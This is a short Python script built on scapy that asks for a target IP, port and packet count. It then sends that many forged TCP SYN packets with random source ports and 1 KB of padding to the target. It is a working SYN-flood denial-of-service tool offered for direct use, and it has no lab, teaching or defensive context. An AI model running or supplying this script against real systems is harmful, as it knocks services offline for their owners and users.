from scapy.all import *

def send_packets(target_ip, target_port, num_packets):
    # forge IP packet with target ip as the destination IP address
    ip = IP(dst=target_ip)

    # forge a TCP SYN packet with a random source port
    # and the target port as the destination port
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

    raw = Raw(b"X" * 1024)

    # stack up the layers
    p = ip / tcp / raw

    try:
        # send the specified number of packets
        send(p, count=num_packets, verbose=0)
        print(f"Sent {num_packets} packets successfully.")
    except KeyboardInterrupt:
        print("Ctrl+C detected. Stopping the program gracefully.")

if __name__ == "__main__":
    # target IP address
    target_ip = input("Enter the target IP: ")

    # target port
    target_port = int(input("Enter the target Port: "))

    # number of packets to send
    num_packets = int(input("Enter the number of packets to send: "))

    # call the function to send packets
    send_packets(target_ip, target_port, num_packets)
